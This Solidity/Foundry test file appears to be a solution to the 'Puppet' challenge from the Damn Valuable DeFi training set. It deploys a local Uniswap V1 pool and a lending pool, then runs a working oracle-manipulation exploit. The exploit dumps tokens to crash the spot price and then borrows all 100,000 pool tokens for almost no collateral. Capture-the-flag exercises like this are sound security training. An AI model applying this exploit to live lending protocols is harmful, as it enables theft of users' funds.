// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";

interface UniswapV1Exchange {
    function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline)
        external
        payable
        returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold) external view returns (uint256);
}

interface UniswapV1Factory {
    function initializeFactory(address template) external;

    function createExchange(address token) external returns (address);
}

contract Puppet is Test {
    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 internal constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;

    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 1_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 25e18;
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    UniswapV1Exchange internal uniswapV1ExchangeTemplate;
    UniswapV1Exchange internal uniswapExchange;
    UniswapV1Factory internal uniswapV1Factory;

    DamnValuableToken internal dvt;
    PuppetPool internal puppetPool;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */
        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        uniswapV1Factory = UniswapV1Factory(deployCode("./src/Contracts/build-uniswap-v1/UniswapV1Factory.json"));

        // Deploy a exchange that will be used as the factory template
        uniswapV1ExchangeTemplate = UniswapV1Exchange(deployCode("./src/Contracts/build-uniswap-v1/UniswapV1Exchange.json"));

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        uniswapExchange = UniswapV1Exchange(uniswapV1Factory.createExchange(address(dvt)));

        vm.label(address(uniswapExchange), "Uniswap Exchange");

        // Deploy the lending pool
        puppetPool = new PuppetPool(address(dvt), address(uniswapExchange));
        vm.label(address(puppetPool), "Puppet Pool");

        // Add initial token and ETH liquidity to the pool
        dvt.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE, // max_tokens
            DEADLINE // deadline
        );

        // Ensure Uniswap exchange is working as expected
        assertEq(
            uniswapExchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(1 ether, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetPool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit_Puppet() public {
        uint256 v1PairBalance = dvt.balanceOf(address(puppetPool));
        console.log("v1PairBalance:", v1PairBalance);

        /* 
         * 1. 将 eth/dvt 降低，通过swap 9.9 eth，可以考虑将1000e18 dvt注入池子
         * 2. 将lending pool的钱通过借款借款 
         */
        emit log("-------------------------- before attack ---------------------------------");
        
        uint256 eth1 = calculateTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE);
        uint256 eth2 = calculateTokenToEthInputPrice(UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE);
        
        emit log_named_decimal_uint("getTokenToEthInputPrice", uniswapExchange.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE), 18);
        emit log_named_decimal_uint("attacker use ATTACKER_INITIAL_TOKEN_BALANCE to swap eth1", eth1, 18);
        emit log_named_decimal_uint("attacker use UNISWAP_INITIAL_TOKEN_RESERVE to swap eth1", eth2, 18);
        
        uint256 shouldETH = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        emit log_named_decimal_uint("attacker should spend ETH amount", shouldETH, 18);
        emit log_named_decimal_uint("attacker actually hold ETH amount", address(attacker).balance, 18);

        emit log("-------------------------- after attack ---------------------------------");
        vm.startPrank(attacker);
        // 1. 将 eth/dvt 降低，通过swap 9.9 eth，可以考虑将1000e18 dvt注入池子
        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, block.timestamp + 1 days);
        shouldETH = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        emit log_named_decimal_uint("attacker should spend ETH amount", shouldETH, 18);
        emit log_named_decimal_uint("attacker actually hold ETH amount", address(attacker).balance, 18);

        // 2. 将lending pool的钱通过借款借款 
        puppetPool.borrow{value: shouldETH}(POOL_INITIAL_TOKEN_BALANCE);
        vm.stopPrank();
        
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertGe(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(puppetPool)), 0);
    }

    // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
    function calculateTokenToEthInputPrice(uint256 input_amount, uint256 input_reserve, uint256 output_reserve)
        internal
        returns (uint256)
    {
        uint256 input_amount_with_fee = input_amount * 997;
        uint256 numerator = input_amount_with_fee * output_reserve;
        uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
        return numerator / denominator;
    }
}
